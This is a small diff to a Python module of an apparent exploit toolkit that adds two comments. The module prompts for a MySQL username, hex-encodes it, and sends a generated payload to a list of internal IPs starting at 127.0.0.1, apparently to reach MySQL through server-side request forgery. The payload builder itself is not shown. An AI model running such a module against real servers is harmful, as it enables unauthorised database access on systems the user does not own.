@@ -25,6 +25,7 @@ class exploit():
     def __init__(self, requester, args):
         logging.info("Module '{}' launched !".format(name))
 
+        # Encode the username for the request
         self.user = input("Give MySQL username: ")
         encode_user = binascii.hexlify( self.user.encode() )
         user_length = len(self.user)
@@ -61,6 +62,8 @@ class exploit():
             self.query  = query
 
         auth = dump.replace("\n","")
+
+        # For every IP generated, send the payload and extract the result
         gen_host = gen_ip_list("127.0.0.1", args.level)
         for ip in gen_host:
             payload = self.get_payload(self.query, auth, ip)
